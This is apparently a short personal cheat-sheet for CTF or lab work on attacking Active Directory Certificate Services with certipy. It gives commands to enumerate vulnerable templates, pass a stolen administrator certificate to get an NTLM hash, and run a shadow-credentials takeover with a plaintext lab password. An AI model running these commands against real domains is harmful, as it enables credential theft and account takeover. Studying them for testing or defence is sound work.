---
bookCollapseSection: true
weight: 8
---
## Find ADCS vulns

`certipy` will automatically find some ESC attacks by enumerating. There might be false positive, and false negatives.

There are some ESC attacks that might not be easy to enumerate unless you are in the right conditions.

```sh
certipy-ad find -u ca_svc -hashes ':xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' -dc-ip $target -vulnerable
```
## Pass the certificate

When we somehow have a certificate of another user, we can pass this certificate to obtain the user's `NTLM` hash

```sh
certipy-ad auth -pfx "administrator.pfx" -dc-ip '172.16.x.x' -username 'user' -domain 'domain'
```

If the pfx is protected by a password, decrypt it first

```sh
certipy-ad cert -export -pfx "administrator.pfx" -password "CERT_PASSWORD" -out "administrator_decrypted.pfx"
```

## Shadow credentials

Don't know how this works, black magic. [Here](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)'s a writeup for more info on the attack.

When you have `GenericWrite` on an account, and ADCS is installed on the domain, we can use `certipy` to request the target account's `certificate`, then `TGT`, then NTLM hash.

```sh
certipy-ad shadow auto -account ca_svc -u p.agila -p 'prometheusx-303' -dc-ip $target
```